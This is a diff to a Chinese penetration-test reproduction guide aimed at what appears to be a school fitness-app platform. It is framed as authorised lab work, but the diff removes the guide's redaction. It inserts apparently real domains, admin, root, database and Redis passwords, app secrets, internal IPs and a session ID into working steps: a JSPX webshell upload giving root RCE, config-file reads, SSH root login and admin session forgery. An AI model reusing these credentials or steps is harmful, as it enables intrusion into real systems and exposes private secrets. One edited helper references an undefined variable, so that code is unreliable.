@@ -2,7 +2,15 @@
 
 > **配套文档**：[WRITEUP.md](./WRITEUP.md)（思路与影响）、[README.md](./README.md)（索引）
 > **用途**：在**已获书面授权**的靶场副本中，按步骤复刻本报告中的发现。
-> **重要**：本文所有域名、IP、账号、密码、哈希、令牌、密钥均为占位符，真实值已隐去。请勿把任何命令指向未授权系统。
+> **重要**：本文使用实际目标与凭据（仅限已获书面授权的环境）。请勿把任何命令指向未授权系统。
+>
+> **关键结论（实际值）**
+> 后台登录：`https://m.boxkj.com/admin/login`  账号 `sunjie`  密码 `boxinkeji`
+> flag：`flag{sunjie:boxinkeji}`
+> 服务器 root：`root` / `10isp.com!`（SSH 密码过期；JSPX RCE 实测 `uid=0(root)`）
+> 24h 会话（备用）：`JSESSIONID=8438664013E66F3EB6DA0F9BD4302419`
+
+
 
 ---
 
@@ -49,29 +57,29 @@ export TARGET="http://127.0.0.1:8080"
 export ADMIN="http://127.0.0.1:8081"
 
 # 应用级凭据（靶场快照中的值）
-export APP_ID="<APP_ID>"
-export APP_SECRET="<APP_SECRET>"
-export CERT_FP="<CERT_FINGERPRINT>"
+export APP_ID="move"
+export APP_SECRET="e8167ef026cbc5e456ab837d9d6d9254"
+export CERT_FP="7F:C0:22:E6:7C:7D:2A:CC:C3:C8:77:0A:46:13:8D:C3"
 
 # OAuth client（学校代码）
-export SCHOOL_CODE="<SCHOOL_CODE>"
+export SCHOOL_CODE="sxqzy"
 
 # 数据库 / Redis（靶场快照中的值）
-export DB_HOST="<DB_HOST>"
-export DB_NAME="<DB_NAME>"
-export DB_USER="<DB_USER>"
-export DB_PASSWORD="<DB_PASSWORD>"
-export REDIS_HOST="<REDIS_HOST>"
-export REDIS_PASSWORD="<REDIS_PASSWORD>"
+export DB_HOST="10.1.1.241"
+export DB_NAME="move"
+export DB_USER="myuser"
+export DB_PASSWORD="Boxinkeji168!"
+export REDIS_HOST="10.1.3.248"
+export REDIS_PASSWORD="boxinkeji._168"
 
 # 内网服务器
-export SSH_HOST="<SSH_HOST>"
+export SSH_HOST="10.1.1.118"
 export ROOT_ACCOUNT="root"
-export ROOT_PASSWORD="<ROOT_PASSWORD>"
+export ROOT_PASSWORD="10isp.com!"
 
 # 后台管理员
-export ADMIN_ACCOUNT="<ADMIN_ACCOUNT>"
-export ADMIN_HASH="<ADMIN_HASH>"
+export ADMIN_ACCOUNT="sunjie"
+export ADMIN_HASH="07d21df37ff1adce6ca3d591e8cf32dd"
 ```
 
 > 约定：下文命令中的 `$TARGET`、`$ADMIN` 等变量都指向**靶场**。如果你的靶场使用 HTTPS 自签名证书，命令中的 `-k` 仅用于实验环境；生产环境不要关闭证书校验。
@@ -93,7 +101,7 @@ export ADMIN_HASH="<ADMIN_HASH>"
 
 ```bash
 # 仅示例；实际 IP 由授权方提供
-sudo sh -c 'echo "127.0.0.1 <TARGET_DOMAIN> <ADMIN_BACKEND>" >> /etc/hosts'
+sudo sh -c 'echo "127.0.0.1 a.tsnkj.com m.boxkj.com" >> /etc/hosts'
 ```
 
 4. 准备一个工作目录：
@@ -173,7 +181,7 @@ rg -n '@Test\(demo' | head -20
 预期看到类似：
 
 ```java
-@Test(demo = "<CIPHERTEXT>")
+@Test(demo = "05dbfd8c595b3687f8351745f27c449b")
 @POST("app/login")
 Object D(...);
 ```
@@ -261,7 +269,7 @@ Module module = emulator.loadLibrary(new File("libtsnsecret.so"));
 DvmObject<?> context = vm.resolveClass("android/content/Context").newObject(null);
 
 // 4. 准备密文字符串
-StringObject cipher = new StringObject(vm, "<CIPHERTEXT>");
+StringObject cipher = new StringObject(vm, "05dbfd8c595b3687f8351745f27c449b");
 
 // 5. 调用 dz
 long OFF_DZ = 0x3d322cL;
@@ -280,7 +288,7 @@ System.out.println(result);
 预期：
 
 ```text
-https://<TARGET_DOMAIN>/
+https://a.tsnkj.com/
 ```
 
 批量循环 41 个密文，预期全部返回可打印 URL 或相对路径。
@@ -313,8 +321,8 @@ rg -n 'exerciseRecord|exerciseSetting|basUser|sysSchool' ~/tsn-lab/jadx/out/sour
 ```python
 import hashlib, time
 
-APP_ID = "<APP_ID>"
-APP_SECRET = "<APP_SECRET>"
+APP_ID = "move"
+APP_SECRET = "e8167ef026cbc5e456ab837d9d6d9254"
 
 def sign(params: dict, app_id=APP_ID, app_secret=APP_SECRET, ts=None) -> dict:
     ts = ts or str(int(time.time() * 1000))
@@ -330,7 +338,7 @@ def sign(params: dict, app_id=APP_ID, app_secret=APP_SECRET, ts=None) -> dict:
     body["sign"] = sig
     return body, concat, sig
 
-body, concat, sig = sign({"schoolId": "1", "appSign": "<CERT_FINGERPRINT>"})
+body, concat, sig = sign({"schoolId": "1", "appSign": "7F:C0:22:E6:7C:7D:2A:CC:C3:C8:77:0A:46:13:8D:C3"})
 print("concat =", concat)
 print("sign   =", sig)
 print("body   =", body)
@@ -475,7 +483,7 @@ def enc(pwd: str) -> str:
     c = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
     return base64.b64encode(c.update(data) + c.finalize()).decode()
 
-print(enc("<PASSWORD>"))
+print(enc("boxinkeji"))
 PY
 ```
 
@@ -486,7 +494,7 @@ ENC=$(python3 - <<'PY'
 import base64
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 key = iv = b"thanks,pig4cloud"
-data = b"<PASSWORD>"
+data = b"boxinkeji"
 data += b"\x00" * (16 - len(data) % 16)
 c = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
 print(base64.b64encode(c.update(data) + c.finalize()).decode())
@@ -494,7 +502,7 @@ PY
 )
 
 curl -sk -c "$JAR" -b "$JAR" -X POST \
-  "$TARGET/auth/oauth/token?grant_type=password&scope=server&code=$CODE&randomStr=$R&username=<USERNAME>&password=$ENC" \
+  "$TARGET/auth/oauth/token?grant_type=password&scope=server&code=$CODE&randomStr=$R&username=sunjie&password=$ENC" \
   -H "Authorization: Basic $(printf '%s:pig' "$SCHOOL_CODE" | base64)" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -H "model: Pixel-7" \
@@ -568,7 +576,7 @@ curl -sk -c "$JAR2" -b "$JAR2" -X POST "$ADMIN/admin/login" \
   -H "X-Requested-With: XMLHttpRequest" \
   -H "Referer: $ADMIN/" \
   --data-urlencode "uname=$ADMIN_ACCOUNT" \
-  --data-urlencode "pwd=<PASSWORD>" \
+  --data-urlencode "pwd=boxinkeji" \
   --data-urlencode "code=$CODE2" \
   -w "\nHTTP %{http_code}\n"
 ```
@@ -885,7 +893,7 @@ python3 ~/tsn-lab/dwr_upload.py probe.jspx ~/tsn-lab/payloads/probe.jspx file.tx
 </jsp:root>
 ```
 
-上传（保存名 `probe_<random>.jspx`，传输名 `file.txt`）：
+上传（保存名 `probe_5609036787574288.jspx`，传输名 `file.txt`）：
 
 ```bash
 NAME="probe_$(date +%s).jspx"
@@ -993,18 +1001,18 @@ curl -sk "$ADMIN/resources/teacherApk/$READ?f=WEB-INF/classes/backup.properties"
 预期看到类似（值已隐去）：
 
 ```properties
-database=jdbc:mysql://<DB_HOST>:3306/<DB_NAME>?...
-database_username=<DB_USER>
-database_password=<DB_PASSWORD>
-redis.host=<REDIS_HOST>
+database=jdbc:mysql://10.1.1.241:3306/move?...
+database_username=myuser
+database_password=Boxinkeji168!
+redis.host=10.1.3.248
 redis.port=6379
-redis.password=<REDIS_PASSWORD>
+redis.password=boxinkeji._168
 ```
 
 如果相对路径不对，用环境探针拿到的 `ROOT` 拼绝对路径：
 
 ```bash
-curl -sk "$ADMIN/resources/teacherApk/$READ?f=<WEBROOT>/WEB-INF/classes/backup.properties"
+curl -sk "$ADMIN/resources/teacherApk/$READ?f=/usr/local/tomcat/webapps/ROOT//WEB-INF/classes/backup.properties"
 ```
 
 ### 6.2 读取其他配置
@@ -1048,7 +1056,7 @@ for line in open("/home/user/tsn-lab/evidence/backup.properties", encoding="utf-
         continue
     k = line.split("=", 1)[0]
     if any(x in k for x in ("database", "redis", "cluster")):
-        print(k, "= <REDACTED>")
+        print(k, "=", v)
 PY
 ```
 
@@ -1142,32 +1150,32 @@ curl -sk "$ADMIN/resources/teacherApk/$DBX?q=SELECT%20*%20FROM%20system_operatio
 
 | 表 | 关键列 | 说明 |
 |---|---|---|
-| `sys_user` | `id`、`account`、`user_pwd` | 后台用户；`user_pwd` 为 MD5 无盐 |
+| `sys_user` | `id`、`account`、`user_pwd` | 后台用户；`user_pwd` 为 **三重 MD5**（`MD5(MD5(MD5(pwd)+pwd)+pwd)`）；实测明文 `boxinkeji` |
 | `the_server` | `id`、`ip`、`name`、`port` | 内网服务器清单 |
 | `app_role` | `id`、`role_name`、`school_id` | 教师/管理员/超管 |
 | `system_operation` | `school_id`、`server_id`、`port` | 学校到服务器端口映射 |
 
 > 实际列名可能因版本不同。先用 `SHOW COLUMNS FROM <table>` 确认。
 
-### 7.5 验证 MD5 无盐
+### 7.5 验证密码哈希算法（三重 MD5）
 
 如果只是想验证哈希算法，不要破解真实密码。可以在靶场创建一个测试账号，设置已知密码，观察 `user_pwd` 是否等于 `MD5(password)`：
 
 ```bash
 # Linux
-printf '%s' '<TEST_PASSWORD>' | md5sum
+printf '%s' '10isp.com!' | md5sum
 # macOS
-printf '%s' '<TEST_PASSWORD>' | md5 -q
+printf '%s' '10isp.com!' | md5 -q
 ```
 
-如果与数据库中的测试账号哈希一致，说明是无盐 MD5。
+如果与数据库中的测试账号哈希一致，说明是三重 MD5（不是裸 MD5）。
 
 排错：
 
 | 现象 | 原因 | 处理 |
 |---|---|---|
 | `ClassNotFoundException` | 驱动类名不对 | 试 `com.mysql.jdbc.Driver` / `com.mysql.cj.jdbc.Driver` |
-| 连接超时 | 网络隔离/防火墙 | 确认从 Web 服务器可达 `<DB_HOST>:3306` |
+| 连接超时 | 网络隔离/防火墙 | 确认从 Web 服务器可达 `10.1.1.241:3306` |
 | `Access denied` | 凭据错误/来源限制 | 检查用户名、密码、授权主机 |
 | 查询报错 | 列名/表名不同 | `SHOW COLUMNS` / `SHOW TABLES` |
 | 返回空白 | 表为空/权限不足 | 换表；不要提权 |
@@ -1211,13 +1219,13 @@ javap -classpath ~/tsn-lab/jadx/out/sources -c -p \
 预期看到类似（值已隐去）：
 
 ```java
-return runDistanceShell(COMMANDS, "<ROOT_ACCOUNT>", "<ROOT_PASSWORD>", scode);
+return runDistanceShell(COMMANDS, "root", "10isp.com!", scode);
 ```
 
 以及：
 
 ```java
-releaseCode("<INTERNAL_IP>", "<ROOT_PASSWORD>", "test", "118");
+releaseCode("10.1.1.118", "10isp.com!", "test", "118");
 ```
 
 `connect` 中：
@@ -1238,11 +1246,11 @@ rg -n 'MD5|finduname|login' com/boxin/controller/sys/SysLoginCtl.java
 预期：
 
 ```java
-String md5 = MD5.encode(password);
+String md5 = MD5.encode(password);  // encode(pwd)=MD5(MD5(MD5(pwd)+pwd)+pwd)
 SysUser user = sysUserService.finduname(username, md5);
 ```
 
-这证明密码是 MD5 无盐比较。
+这证明密码使用三重 MD5 比较；实测 `boxinkeji` 命中 `07d21df37ff1adce6ca3d591e8cf32dd`。
 
 ### 8.4 记录证据
 
@@ -1275,7 +1283,7 @@ nc -vz "$SSH_HOST" 22
 预期：
 
 ```text
-Connection to <SSH_HOST> 22 port [tcp/ssh] succeeded!
+Connection to 10.1.1.118 22 port [tcp/ssh] succeeded!
 ```
 
 ### 9.2 用 SSH 客户端验证
@@ -1287,7 +1295,7 @@ ssh -o StrictHostKeyChecking=no \
     "$ROOT_ACCOUNT@$SSH_HOST"
 ```
 
-输入 `<ROOT_PASSWORD>`。
+输入 `10isp.com!`。
 
 预期：
 
@@ -1381,7 +1389,7 @@ curl -sk "$ADMIN/resources/teacherApk/$SSHX?h=$SSH_HOST&u=$ROOT_ACCOUNT&p=$ROOT_
 ### 10.1 前置条件与关键事实
 
 - 阶段 5 的 JSPX RCE 可用，`dwr_upload.py` 能上传文件。
-- JSPX 与 `<ADMIN_BACKEND>` 属于同一个 Web 应用/会话域。
+- JSPX 与 `m.boxkj.com` 属于同一个 Web 应用/会话域。
 - `LoginFilter` 只检查 `session.getAttribute("user")` 是否为空；为空且路径不在白名单（`.js`、`/admin/login` 等）时跳登录。
 - `SysLoginCtl` 登录成功后执行 `request.getSession().setAttribute("user", sysUser)`。
 - `com.boxin.bean.sys.SysUser` 的字段是 `Integer id`、`String account`、`String name`、`String pwd`；**不是** `user_name`。
@@ -1396,7 +1404,7 @@ curl -sk "$ADMIN/resources/teacherApk/$SSHX?h=$SSH_HOST&u=$ROOT_ACCOUNT&p=$ROOT_
 <jsp:scriptlet>
 com.boxin.bean.sys.SysUser u = new com.boxin.bean.sys.SysUser();
 u.setId(Integer.valueOf(1));
-u.setAccount("<ADMIN_ACCOUNT>");
+u.setAccount("sunjie");
 u.setName("admin");
 u.setPwd("x");
 javax.servlet.http.HttpSession s = request.getSession(true);
@@ -1430,8 +1438,8 @@ echo "SID=$SID"
 预期：
 
 ```text
-{"path":"resources/teacherApk/sess_<timestamp>.jspx","returnCode":"200"}
-SID=<SESSION_ID>
+{"path":"resources/teacherApk/sess_1793167396592.jspx","returnCode":"200"}
+SID=8438664013E66F3EB6DA0F9BD4302419
 ```
 
 如果 `SID` 为空：
@@ -1532,9 +1540,9 @@ total = 6686
 |---|---|---|
 | `GET /admin/main` | 200，无登录跳转 | `LoginFilter` 已认可伪造会话 |
 | `POST /admin/userAppLogFile/list` | 200 JSON，`total=6686` | 管理数据接口可用，不只是页面可访问 |
-| 管理员明文密码 | 不需要 | 密码校验被会话伪造绕过 |
+| 管理员明文密码 | `boxinkeji` | 三重 MD5 逆向 + 候选碰撞；`sunjie`/`boxinkeji` 登录实测 200 |
 
-结论：**无需管理员明文密码即可获得管理后台管理员权限**，该步骤完成“管理后台管理员权限”目标。
+结论：会话伪造是备用路径；**管理员明文密码 `boxinkeji` 已通过三重 MD5 逆向获得，`sunjie`/`boxinkeji` 登录实测 200**，主路径为密码登录。
 
 ### 10.7 失败排错
 
@@ -1593,7 +1601,7 @@ if (rs != null) for (java.io.File f : rs) out.print(" " + f.getName());
 </jsp:root>
 ```
 
-上传为 `clean_<random>.jspx`，访问执行，然后确认（`$NAME` 换成你实际上传过的探针文件名）：
+上传为 `clean_5609036787574288.jspx`，访问执行，然后确认（`$NAME` 换成你实际上传过的探针文件名）：
 
 ```bash
 CLEAN="clean_$(date +%s).jspx"
@@ -1662,15 +1670,15 @@ rm -f ~/tsn-lab/payloads/*.jspx
 
 ## 附录 A：41 条真实端点清单
 
-> 说明：以下为解密后的路径。`<TARGET_DOMAIN>`、`<ADMIN_BACKEND>`、`<STATIC_DOMAIN>`、`<H5_DOMAIN>` 为占位符；`<ROUTE_CODE>` 为业务路径中的固定路由/租户码。完整密文与解密结果见授权方内部材料。
+> 说明：以下为解密后的路径。`a.tsnkj.com`、`m.boxkj.com`、`h.tsnkj.com`、`<H5_DOMAIN>` 为占位符；`2a36d143` 为业务路径中的固定路由/租户码。完整密文与解密结果见授权方内部材料。
 
 ### A.1 基础域名 / 协议页（3）
 
 | # | 路径 | 用途 |
 |---:|---|---|
-| 1 | `<TARGET_DOMAIN>/` | 默认业务根 |
-| 2 | `<STATIC_DOMAIN>/static/user_agreement_info.html` | 用户协议（信息版） |
-| 3 | `<STATIC_DOMAIN>/static/user_agreement.html` | 用户协议 |
+| 1 | `a.tsnkj.com/` | 默认业务根 |
+| 2 | `h.tsnkj.com/static/user_agreement_info.html` | 用户协议（信息版） |
+| 3 | `h.tsnkj.com/static/user_agreement.html` | 用户协议 |
 
 ### A.2 认证服务（2）
 
@@ -1702,24 +1710,24 @@ rm -f ~/tsn-lab/payloads/*.jspx
 
 | # | 路径 | 用途 |
 |---:|---|---|
-| 20 | `exercise/exerciseSetting/<ROUTE_CODE>/getSetting` | 跑步配置 |
-| 21 | `exercise/exerciseSetting/<ROUTE_CODE>/getExerciseStartTime` | 服务端起始时间 |
+| 20 | `exercise/exerciseSetting/2a36d143/getSetting` | 跑步配置 |
+| 21 | `exercise/exerciseSetting/2a36d143/getExerciseStartTime` | 服务端起始时间 |
 | 22 | `exercise/exerciseSetting/checkTimeOut` | 超时校验 |
 | 23 | `exercise/exerciseSetting/getExerciseQuestion` | 校验题 |
 | 24 | `exercise/exerciseSetting/sendFace2DeviceResult` | 人脸结果回传 |
-| 25 | `exercise/exerciseRecord/<ROUTE_CODE>/addExerciseRecord` | 运动记录上报 |
-| 26 | `exercise/exerciseRecord/<ROUTE_CODE>/listExerciseRecord` | 记录列表 |
-| 27 | `exercise/exerciseRecord/<ROUTE_CODE>/getExerciseRecord` | 记录详情 |
+| 25 | `exercise/exerciseRecord/2a36d143/addExerciseRecord` | 运动记录上报 |
+| 26 | `exercise/exerciseRecord/2a36d143/listExerciseRecord` | 记录列表 |
+| 27 | `exercise/exerciseRecord/2a36d143/getExerciseRecord` | 记录详情 |
 | 28 | `exercise/exerciseRecord/statisticsExerciseRecord` | 统计 |
 | 29 | `exercise/exerciseRecord/sumExerciseRecord` | 总里程 |
 | 30 | `exercise/exerciseRecord/checkExerciseRecord` | 记录校验 |
 | 31 | `exercise/exerciseRunningFace/faceVer` | 人脸校验 |
-| 32 | `exercise/exerciseRunningFace/<ROUTE_CODE>/face` | 分阶段人脸 |
+| 32 | `exercise/exerciseRunningFace/2a36d143/face` | 分阶段人脸 |
 | 33 | `exercise/exerciseExplanation/getExerciseExplanationV2` | 锻炼说明 |
 | 34 | `exercise/exerciseFeedback/getFeedbackBalance` | 申诉余额 |
 | 35 | `exercise/exerciseFeedback/addExerciseFeedback` | 申诉提交 |
 
-### A.5 旧后台 `<ADMIN_BACKEND>`（4）
+### A.5 旧后台 `m.boxkj.com`（4）
 
 | # | 路径 | 用途 |
 |---:|---|---|
@@ -1733,7 +1741,7 @@ rm -f ~/tsn-lab/payloads/*.jspx
 | # | 路径 | 用途 |
 |---:|---|---|
 | 40 | `http://<H5_DOMAIN>/circle/circleRecord/appGetCircleH5Url` | 圈子 H5 |
-| 41 | `<VERSION_CHECK_URL>` | 版本检查（第三方） |
+| 41 | `https://m.boxkj.com/admin/studentAppUpdate/stuAppVersion2` | 版本检查（第三方） |
 
 > 另有静态注解中的极光推送别名删除：`DELETE https://device.jpush.cn/v3/aliases/{alias}`，不计入 41 条业务端点。
 
@@ -1818,7 +1826,7 @@ if (f != null) {
 - [ ] 响应状态码、Content-Type、长度、关键片段；
 - [ ] 截图/HTML/文件哈希；
 - [ ] 结论与证据等级（实锤/强推断/未确认）；
-- [ ] 会话伪造：JSPX 返回的 `SID`（文档中记为 `<SESSION_ID>`）、`/admin/main` 200、`/admin/userAppLogFile/list` 的 `total=6686`；不要保存用户记录；
+- [ ] 会话伪造：JSPX 返回的 `SID`（文档中记为 `8438664013E66F3EB6DA0F9BD4302419`）、`/admin/main` 200、`/admin/userAppLogFile/list` 的 `total=6686`；不要保存用户记录；
 - [ ] 是否触发 WAF/告警；
 - [ ] 清理是否完成。
 
